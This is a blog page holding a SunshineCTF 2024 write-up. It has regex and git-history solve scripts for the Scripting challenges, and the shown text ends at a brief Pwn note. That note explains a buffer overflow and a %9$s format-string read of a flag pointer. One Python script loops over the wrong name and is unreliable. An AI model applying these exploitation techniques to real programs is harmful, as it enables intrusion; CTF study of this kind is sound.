
  <!DOCTYPE html>
  <html lang="en"  >
  <head>
  <meta charset="utf-8">
  

  

  

  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
  
  <title>
    SunshineCTF 2024 writeup-by.naup96321 |
    
    堇姬 Naup&#39;s Blog
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  
    <meta name="description" content="SunshineCTF 2024 writeup-by.naup96321 Author: 堇姬NaupWAN - r.k.10  This is myself some solve script and easy writeup. Just record some questions My solve listimage My team score boardimage ScriptingThi">
<meta property="og:type" content="article">
<meta property="og:title" content="SunshineCTF 2024 writeup-by.naup96321">
<meta property="og:url" content="http://example.com/2024/10/22/sunshineCTF-2024-writeup/index.html">
<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
<meta property="og:description" content="SunshineCTF 2024 writeup-by.naup96321 Author: 堇姬NaupWAN - r.k.10  This is myself some solve script and easy writeup. Just record some questions My solve listimage My team score boardimage ScriptingThi">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/B1JE1yNlkx.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyYLkkEgyx.png">
<meta property="article:published_time" content="2024-10-22T12:03:47.000Z">
<meta property="article:modified_time" content="2024-10-22T12:05:18.355Z">
<meta property="article:author" content="Naup堇姬">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/B1JE1yNlkx.png">
  
  
    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/fav.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">

  
  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>

  <body>
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        
          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg>
        
      </div>
      <div class="loading-word">Naup...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/">Home</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/archives">Archives</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
            &#xe62b;
          </div>
          <a class="main-nav-link" href="/about">About</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
    
    
    
  </nav>
</div>
<header id="header">
  
    <picture>
      
    </picture>
    
      <img fetchpriority="high" src="/images/banner.webp" alt="SunshineCTF 2024 writeup-by.naup96321">
    
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">SunshineCTF 2024 writeup-by.naup96321</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content"  class="sidebar-right" >
          <aside id="sidebar">
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SunshineCTF-2024-writeup-by-naup96321"><span class="toc-number">1.</span> <span class="toc-text">SunshineCTF 2024 writeup-by.naup96321</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#My-solve-list"><span class="toc-number">1.0.1.</span> <span class="toc-text">My solve list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-team-score-board"><span class="toc-number">1.0.2.</span> <span class="toc-text">My team score board</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scripting"><span class="toc-number">2.</span> <span class="toc-text">Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-0"><span class="toc-number">2.1.</span> <span class="toc-text">Guessy Programmer 0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script"><span class="toc-number">2.1.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-1"><span class="toc-number">2.2.</span> <span class="toc-text">Guessy Programmer 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-2"><span class="toc-number">2.3.</span> <span class="toc-text">Guessy Programmer 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-3"><span class="toc-number">2.4.</span> <span class="toc-text">Guessy Programmer 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">script</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag-Shop"><span class="toc-number">3.1.</span> <span class="toc-text">Flag Shop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-4"><span class="toc-number">3.1.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adventure-On-the-High-C"><span class="toc-number">3.2.</span> <span class="toc-text">Adventure! On the High C!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-5"><span class="toc-number">3.2.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap01"><span class="toc-number">3.3.</span> <span class="toc-text">heap01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-6"><span class="toc-number">3.3.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after"><span class="toc-number">3.4.</span> <span class="toc-text">after</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">55</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">4</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
      
      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  <div class="sidebar-widget">
  
  </div>
</aside>

          <section id="main"><article id="post-sunshineCTF-2024-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <a href="/2024/10/22/sunshineCTF-2024-writeup/" class="article-date-link" data-aos="zoom-in">
    <time datetime="2024-10-22T12:03:47.000Z" itemprop="datePublished">2024-10-22</time>
    <time style="display: none;" id="post-update-time">2024-10-22</time>
  </a>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id="SunshineCTF-2024-writeup-by-naup96321"><a href="#SunshineCTF-2024-writeup-by-naup96321" class="headerlink" title="SunshineCTF 2024 writeup-by.naup96321"></a>SunshineCTF 2024 writeup-by.naup96321</h1><blockquote>
<p>Author: 堇姬Naup<br>WAN - r.k.10</p>
</blockquote>
<p>This is myself some solve script and easy writeup. Just record some questions</p>
<h3 id="My-solve-list"><a href="#My-solve-list" class="headerlink" title="My solve list"></a>My solve list</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/B1JE1yNlkx.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1JE1yNlkx.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="My-team-score-board"><a href="#My-team-score-board" class="headerlink" title="My team score board"></a>My team score board</h3><p><div class="img-item" data-src="https://hackmd.io/_uploads/SyYLkkEgyx.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyYLkkEgyx.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h1 id="Scripting"><a href="#Scripting" class="headerlink" title="Scripting"></a>Scripting</h1><p>This catagory challenge give you one git bundle<br>Use</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone &lt;git bundle&gt; &lt;folder path&gt;</span><br></pre></td></tr></table></figure>
<p>can get git.</p>
<h2 id="Guessy-Programmer-0"><a href="#Guessy-Programmer-0" class="headerlink" title="Guessy Programmer 0"></a>Guessy Programmer 0</h2><p>Just one file which have many many <code>sun...</code>，just use regex find <code>sun\&#123;.*?\&#125;</code> and then we will get flag.</p>
<h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, content)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="keyword">match</span>.group()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;adventure_novel.txt&#x27;</span></span><br><span class="line">check(file)</span><br></pre></td></tr></table></figure>

<h2 id="Guessy-Programmer-1"><a href="#Guessy-Programmer-1" class="headerlink" title="Guessy Programmer 1"></a>Guessy Programmer 1</h2><p>It has many many git commit history and all commit have file(adventure_novel_2.txt) which have many <code>sun...</code> words.</p>
<p>First, I write git log to log.txt.<br>And then fetch all commit history and <code>git show</code> .<br>Final, using regex filter <code>sun\&#123;.*?\&#125;</code></p>
<h3 id="script-1"><a href="#script-1" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">commits</span>(<span class="params">log</span>):</span><br><span class="line">    commits = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">&quot;commit&quot;</span>):</span><br><span class="line">                commits.append(line.split()[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> commits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">match</span>(<span class="params">commit, file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file_content = subprocess.check_output(</span><br><span class="line">            [<span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;show&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;commit&#125;</span>:<span class="subst">&#123;file_path&#125;</span>&#x27;</span>],</span><br><span class="line">            stderr=subprocess.STDOUT</span><br><span class="line">        ).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">        aa = re.findall(pattern, file_content) </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> aa  </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">log, file</span>):</span><br><span class="line">    commit = commits(log)</span><br><span class="line">    <span class="keyword">for</span> commit <span class="keyword">in</span> commits:</span><br><span class="line">        aa = <span class="keyword">match</span>(commit, file)</span><br><span class="line">        <span class="keyword">if</span> aa:</span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> aa:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;commit&#125;</span>: <span class="subst">&#123;<span class="keyword">match</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">log = <span class="string">&#x27;log.txt&#x27;</span>  </span><br><span class="line">file = <span class="string">&#x27;adventure_novel_2.txt&#x27;</span>  </span><br><span class="line">main(log, file)</span><br></pre></td></tr></table></figure>

<h2 id="Guessy-Programmer-2"><a href="#Guessy-Programmer-2" class="headerlink" title="Guessy Programmer 2"></a>Guessy Programmer 2</h2><p>Add some base64 confuse my regex.<br>I add <code>[A-Za-z0-9+/=]&#123;20,&#125;</code> . If it may base64 word, it will be decoded.<br>Last part same as Guessy Programmer 1.</p>
<h3 id="script-2"><a href="#script-2" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_commits</span>(<span class="params">log_file</span>):</span><br><span class="line">    commits = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">&quot;commit&quot;</span>):</span><br><span class="line">                commits.append(line.split()[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> commits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64_if_needed</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_content = base64.b64decode(content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> decoded_content</span><br><span class="line">    <span class="keyword">except</span> (base64.binascii.Error, UnicodeDecodeError):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_pattern_in_commit</span>(<span class="params">commit, file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file_content = subprocess.check_output(</span><br><span class="line">            [<span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;show&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;commit&#125;</span>:<span class="subst">&#123;file_path&#125;</span>&#x27;</span>],</span><br><span class="line">            stderr=subprocess.STDOUT</span><br><span class="line">        ).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">        matches = re.findall(pattern, file_content)</span><br><span class="line"></span><br><span class="line">        base64_pattern = <span class="string">r&#x27;[A-Za-z0-9+/=]&#123;20,&#125;&#x27;</span></span><br><span class="line">        base64_matches = re.findall(base64_pattern, file_content)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> b64_string <span class="keyword">in</span> base64_matches:</span><br><span class="line">            decoded_content = decode_base64_if_needed(b64_string)</span><br><span class="line">            <span class="keyword">if</span> decoded_content:</span><br><span class="line">                matches += re.findall(pattern, decoded_content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> matches</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">log_file, file_path</span>):</span><br><span class="line">    commits = get_commits(log_file)</span><br><span class="line">    <span class="keyword">for</span> commit <span class="keyword">in</span> commits:</span><br><span class="line">        matches = check_pattern_in_commit(commit, file_path)</span><br><span class="line">        <span class="keyword">if</span> matches:</span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;commit&#125;</span>: <span class="subst">&#123;<span class="keyword">match</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">log_file = <span class="string">&#x27;log.txt&#x27;</span>  </span><br><span class="line">file_path = <span class="string">&#x27;adventure_novel_2.txt&#x27;</span>  </span><br><span class="line">main(log_file, file_path)</span><br></pre></td></tr></table></figure>

<h2 id="Guessy-Programmer-3"><a href="#Guessy-Programmer-3" class="headerlink" title="Guessy Programmer 3"></a>Guessy Programmer 3</h2><p>It is .gif.<br>but if i cat .git, it has flag(base64 or not)<br>Use <code>.sh</code> fetch all commit git’s word.<br>Last part same as Guessy Programmer 1.</p>
<h3 id="script-3"><a href="#script-3" class="headerlink" title="script"></a>script</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">a.txt</span></span><br><span class="line"></span><br><span class="line">commits=$(grep -oP &#x27;(?&lt;=commit )\w+&#x27; log.txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for commit in $commits; do</span><br><span class="line"></span><br><span class="line">    git show &quot;$commit:adventure_novel_3.gif&quot; &gt;&gt; a.txt 2&gt;/dev/null</span><br><span class="line">    if [ $? -ne 0 ]; then</span><br><span class="line">        echo &quot;$commit no have adventure_novel_3.gif&quot; &gt;&gt; a.txt</span><br><span class="line">    else</span><br><span class="line">        echo &quot;$commit&quot; &gt;&gt; a.txt</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &quot;success&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64_if_needed</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_content = base64.b64decode(content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> decoded_content</span><br><span class="line">    <span class="keyword">except</span> (base64.binascii.Error, UnicodeDecodeError):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line"></span><br><span class="line">file_content = content</span><br><span class="line">pattern = <span class="string">r&#x27;sun\&#123;.*?\&#125;&#x27;</span></span><br><span class="line">matches = re.findall(pattern, file_content)</span><br><span class="line"></span><br><span class="line">base64_pattern = <span class="string">r&#x27;[A-Za-z0-9+/=]&#123;20,&#125;&#x27;</span></span><br><span class="line">base64_matches = re.findall(base64_pattern, file_content)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> b64_string <span class="keyword">in</span> base64_matches:</span><br><span class="line">    decoded_content = decode_base64_if_needed(b64_string)</span><br><span class="line">    <span class="keyword">if</span> decoded_content:</span><br><span class="line">        matches += re.findall(pattern, decoded_content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(matches)</span><br></pre></td></tr></table></figure>

<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>This is my CTF templates, you can give my repo one star!!! if you like.<br><a target="_blank" rel="noopener" href="https://github.com/Naupjjin/MyCTFLib.git">https://github.com/Naupjjin/MyCTFLib.git</a></p>
<h2 id="Flag-Shop"><a href="#Flag-Shop" class="headerlink" title="Flag Shop"></a>Flag Shop</h2><p>buffer overflow and use fmt read flag pointer(on stack) to screen.<br>buffer overflow can write isadmin, and then bypass admin panel’s <code>if</code>.<br>%9$s -&gt; rsp + 0x18(flag pointer) -&gt; flag</p>
